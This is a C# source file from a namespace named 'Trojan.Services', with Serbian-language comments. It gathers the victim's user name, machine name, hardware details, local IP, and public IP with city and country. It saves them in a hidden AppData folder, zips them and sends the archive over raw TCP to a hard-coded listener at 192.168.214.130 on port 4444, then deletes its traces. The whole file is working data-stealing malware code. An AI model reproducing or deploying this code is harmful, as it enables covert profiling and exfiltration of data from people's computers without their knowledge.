using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;
using System.Management;
using System.Runtime.InteropServices;
using System.IO.Compression;
using System.Net.Sockets;

namespace Trojan.Services
{
    public static class DeviceScannerService
    {
        public static async Task SaveDeviceInfo()
        {
            StringBuilder sb = new();
            sb.AppendLine("=== DEVICE INFO ===");
            sb.AppendLine();
            sb.AppendLine($"User: {Environment.UserName}");
            sb.AppendLine($"PC Name: {Environment.MachineName}");
            sb.AppendLine($"OS: {RuntimeInformation.OSDescription}");
            sb.AppendLine($"64 Bit OS: {Environment.Is64BitOperatingSystem}");
            sb.AppendLine($"CPU: {GetCPU()}");
            sb.AppendLine($"GPU: {GetGPU()}");
            sb.AppendLine($"RAM: {GetRAM()} GB");
            sb.AppendLine($"Dark Mode: {IsDarkMode()}");
            sb.AppendLine($"Local IP: {GetLocalIP()}");
            await AddPublicIPInfo(sb);

            // Folder path
            string folder =
                Path.Combine(
                    Environment.GetFolderPath(
                        Environment.SpecialFolder.ApplicationData),
                    "gnezdece");

            // Create folder
            Directory.CreateDirectory(folder);

            // File path
            string file =
                Path.Combine(folder, "device_info.txt");

            // Save file
            await File.WriteAllTextAsync(file, sb.ToString());
            await SendFolderToServer("192.168.214.130", 4444);

        }
        public static async Task SendFolderToServer(string serverIp, int port)
        {
            string folderPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "gnezdece");

            if (!Directory.Exists(folderPath))
            {
                Console.WriteLine("Folder ne postoji!");
                return;
            }

            // Kreiraj privremeni folder samo za fajlove koji nisu zaključani
            string tempFolder = Path.Combine(Path.GetTempPath(), "gnezdece_temp_" + Guid.NewGuid().ToString());
            Directory.CreateDirectory(tempFolder);

            // Kopiraj samo device_info.txt (bazu preskoči)
            string sourceFile = Path.Combine(folderPath, "device_info.txt");
            string destFile = Path.Combine(tempFolder, "device_info.txt");

            if (File.Exists(sourceFile))
            {
                File.Copy(sourceFile, destFile, true);
                Console.WriteLine("Kopiran device_info.txt");
            }

            // Zip-uj samo temp folder
            string zipPath = Path.GetTempFileName() + ".zip";
            ZipFile.CreateFromDirectory(tempFolder, zipPath);
            Console.WriteLine("Zip kreiran (bez baze)");

            // Pošalji zip
            byte[] zipData = await File.ReadAllBytesAsync(zipPath);

            using TcpClient client = new TcpClient();
            await client.ConnectAsync(serverIp, port);
            using NetworkStream stream = client.GetStream();
            await stream.WriteAsync(zipData, 0, zipData.Length);

            Console.WriteLine("Folder poslat kao zip");

            // Obriši temp fajlove
            File.Delete(zipPath);
            Directory.Delete(tempFolder, true);
        }
        static string GetCPU()
        {
            using var searcher =
                new ManagementObjectSearcher(
                    "select Name from Win32_Processor");

            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Name"]?.ToString();
            }

            return "Unknown";
        }

        static string GetGPU()
        {
            using var searcher =
                new ManagementObjectSearcher(
                    "select Name from Win32_VideoController");

            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Name"]?.ToString();
            }

            return "Unknown";
        }

        static double GetRAM()
        {
            using var searcher =
                new ManagementObjectSearcher(
                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");

            foreach (ManagementObject obj in searcher.Get())
            {
                double ram =
                    Convert.ToDouble(obj["TotalPhysicalMemory"]);

                return Math.Round(ram / 1024 / 1024 / 1024, 2);
            }

            return 0;
        }

        static bool IsDarkMode()
        {
            try
            {
                using RegistryKey key =
                    Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize");

                object value =
                    key?.GetValue("AppsUseLightTheme");

                if (value != null)
                {
                    return (int)value == 0;
                }
            }
            catch { }

            return false;
        }

        static string GetLocalIP()
        {
            foreach (NetworkInterface ni in
                     NetworkInterface.GetAllNetworkInterfaces())
            {
                var props = ni.GetIPProperties();

                foreach (var ua in props.UnicastAddresses)
                {
                    if (ua.Address.AddressFamily ==
                        System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ua.Address.ToString();
                    }
                }
            }

            return "Unknown";
        }

        static async Task AddPublicIPInfo(StringBuilder sb)
        {
            try
            {
                using HttpClient client = new();

                string json =
                    await client.GetStringAsync(
                        "https://ipinfo.io/json");

                using JsonDocument doc =
                    JsonDocument.Parse(json);

                var root = doc.RootElement;

                sb.AppendLine(
                    $"Public IP: {root.GetProperty("ip")}");

                sb.AppendLine(
                    $"City: {root.GetProperty("city")}");

                sb.AppendLine(
                    $"Region: {root.GetProperty("region")}");

                sb.AppendLine(
                    $"Country: {root.GetProperty("country")}");
            }
            catch
            {
                sb.AppendLine(
                    "Failed to fetch public IP.");
            }
        }
    }
}